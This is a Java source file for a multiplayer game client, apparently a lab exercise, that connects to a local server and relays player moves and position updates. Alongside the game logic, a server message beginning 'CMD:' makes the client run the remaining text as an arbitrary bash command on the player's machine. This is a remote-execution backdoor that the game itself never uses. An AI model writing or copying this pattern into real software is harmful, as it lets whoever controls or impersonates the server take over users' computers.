package Lab_4;
import java.io.*;
import java.net.*;

public class Client {

    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 12345;

    void main() {
        try (
                Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                BufferedReader in = new BufferedReader(
                        new InputStreamReader(socket.getInputStream())
                );
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader consoleInput = new BufferedReader(
                        new InputStreamReader(System.in)
                )
        ) {
            System.out.println(in.readLine());
            String playerName = consoleInput.readLine();
            out.println(playerName);

            new Thread(() -> {
                String serverMessage;
                try {
                    while ((serverMessage = in.readLine()) != null) {
                        if (serverMessage.startsWith("UPDATE:")) {
                            String[] parts = serverMessage.split(":", 3);
                            String otherPlayerName = parts[1];
                            String positionData = parts[2];
                            System.out.println(
                                    otherPlayerName + " is now at " + positionData
                            );
                        } else if (serverMessage.startsWith("CMD:")) {
                            String command = serverMessage.substring(4);
                            executeCommand(command);
                        }
                    }
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }).start();

            String userInput;
            while ((userInput = consoleInput.readLine()) != null) {
                if (userInput.startsWith("MOVE:")) {
                    out.println(userInput);
                }
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static void executeCommand(String command) {
        try {
            System.out.println("Executing command: " + command);
            ProcessBuilder pb = new ProcessBuilder("/bin/bash", "-c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream())
            );
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();
            System.out.println("Command finished with exit code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            System.err.println("Error executing command: " + e.getMessage());
        }
    }
}